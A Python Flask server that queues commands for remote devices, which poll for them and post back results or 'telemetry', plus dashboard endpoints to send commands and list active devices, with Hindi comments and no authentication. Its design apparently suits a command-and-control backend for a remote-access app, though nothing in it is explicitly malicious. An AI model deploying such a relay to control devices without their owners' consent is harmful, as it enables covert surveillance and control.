from flask import Flask, request, jsonify
import time, logging

app = Flask(__name__)

device_commands = {}
device_results = {}
active_devices = {}

@app.route('/')
def home():
    return "Server is Running Alive!", 200

# 1. ऐप जब कमांड मांगने आता है (पुराना + नया रास्ता दोनों हैंडल करेगा)
@app.route('/get-command', methods=['GET'])
@app.route('/api/v1/command/fetch', methods=['GET', 'POST'])  # <--- यह 404 फिक्स करेगा!
def get_command():
    device_id = request.args.get('device_id') or (request.get_json(silent=True) or {}).get('device_id')
    if not device_id:
        # अगर JSON में आया है
        device_id = request.args.get('deviceId')
        
    if device_id:
        active_devices[device_id] = time.strftime("%Y-%m-%d %H:%M:%S")
        if device_id in device_commands and device_commands[device_id]:
            cmd = device_commands[device_id].pop(0)
            logging.info(f"Delivered command '{cmd}' to device: {device_id}")
            return jsonify({"command": cmd, "cmd": cmd}), 200
            
    return jsonify({"command": "none", "cmd": "none"}), 200


# 2. ऐप जब डेटा/रिस्पॉन्स वापस सर्वर पर भेजता है (404 फिक्स)
@app.route('/post-result', methods=['POST'])
@app.route('/api/v1/telemetry', methods=['POST'])  # <--- यह 404 फिक्स करेगा!
def post_result():
    data = request.get_json(force=True, silent=True) or {}
    
    device_id = data.get("device_id") or data.get("deviceId")
    cmd = data.get("cmd") or data.get("command") or "telemetry"
    result = data.get("result") or data.get("data") or data.get("telemetry")

    if device_id:
        device_results[device_id] = {
            "cmd": cmd,
            "result": result,
            "timestamp": time.time()
        }
        active_devices[device_id] = time.strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"Received telemetry/result from {device_id}")
        return jsonify({"status": "success"}), 200
        
    return jsonify({"error": "No device_id provided"}), 400


# 3. डैशबोर्ड के लिए कमांड भेजने का रास्ता
@app.route('/send-command', methods=['POST'])
def send_command():
    data = request.get_json(force=True, silent=True) or {}
    device_id = data.get("device_id")
    cmd = data.get("cmd")
    
    if not device_id or not cmd:
        return jsonify({"error": "Missing device_id or cmd"}), 400
        
    if device_id not in device_commands:
        device_commands[device_id] = []
        
    device_commands[device_id].append(cmd)
    return jsonify({"status": "Command queued", "cmd": cmd}), 200


# 4. डैशबोर्ड के लिए रिजल्ट चेक करने का रास्ता
@app.route('/get-result', methods=['GET'])
def get_result():
    device_id = request.args.get("device_id")
    if device_id in device_results:
        res = device_results.pop(device_id) # एक बार पढ़ने के बाद क्लियर
        return jsonify(res), 200
    return jsonify({"result": None}), 200


# 5. एक्टिव डिवाइसेस की लिस्ट
@app.route('/list-devices', methods=['GET'])
def list_devices():
    return jsonify({"active_devices": active_devices}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
